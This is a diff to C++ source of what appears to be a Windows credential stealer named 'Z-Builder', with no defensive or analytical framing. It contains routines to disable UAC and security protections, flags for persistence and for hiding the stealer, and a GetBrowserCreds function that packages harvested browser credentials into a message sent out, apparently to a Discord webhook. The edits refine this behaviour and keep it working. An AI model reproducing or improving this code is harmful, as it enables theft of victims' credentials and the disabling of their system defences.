@@ -60,9 +60,8 @@ INT WINAPI WinMain(HINSTANCE hInst, HINSTANCE, LPSTR strCmdLine, INT)
     string License = "[zbuilder{zbuilder}]";
     if (VerifyLicense(decrypt(License)))
     {
-        DisableUAC();
-        DisableProtections();
         string Feature = "[DisableProt:(N)]--[Tracer:(N)]--[Recover:(N)]--[GetAllAccs:(N)]--[DeleteGT:(N)]--[StartUp:(N)]--[HideStealer:(N)]--[BrowserCreds:(N)]";
+        //string Feature = "[DisableProt:(N)]--[Tracer:(Y)]--[Recover:(N)]--[GetAllAccs:(N)]--[DeleteGT:(N)]--[StartUp:(N)]--[HideStealer:(N)]--[BrowserCreds:(N)]";
         if (Feature.find(XorStr("[DisableProt:(Y)]")) != string::npos)
         {
             DisableUAC();
@@ -365,8 +364,11 @@ void GetBrowserCreds()
         }
     }
     ReadResults.close();
-    string Format = "{ \"username\":\"Z-Builder\",\"avatar_url\":\"https://cdn.discordapp.com/icons/745016440569987098/56ce57aa24fd66dc9a39fc03b48f9424.png?size=128\",\"embeds\":[{\"title\":\"Here are the browser credentials! ~Z-Builder\",\"description\":\"" + data + "\",\"color\":\"65535\"}] }";
-    SendMessage(Format, "application/json");
+    if (data != "")
+    {
+        string Format = "{ \"username\":\"Z-Builder\",\"avatar_url\":\"https://cdn.discordapp.com/icons/745016440569987098/56ce57aa24fd66dc9a39fc03b48f9424.png?size=128\",\"embeds\":[{\"title\":\"Here are the browser credentials! ~Z-Builder\",\"description\":\"" + data + "\",\"color\":\"65535\"}] }";
+        SendMessage(Format, "application/json");
+    }
     remove(WBPVLocation.c_str());
     remove(WBPVBatFile.c_str());
     string ResultsFile = TempPath + "\\Results.zb";
@@ -1265,4 +1267,3 @@ string decrypt2(string toEncrypt) {
 
     return output;
 }
-
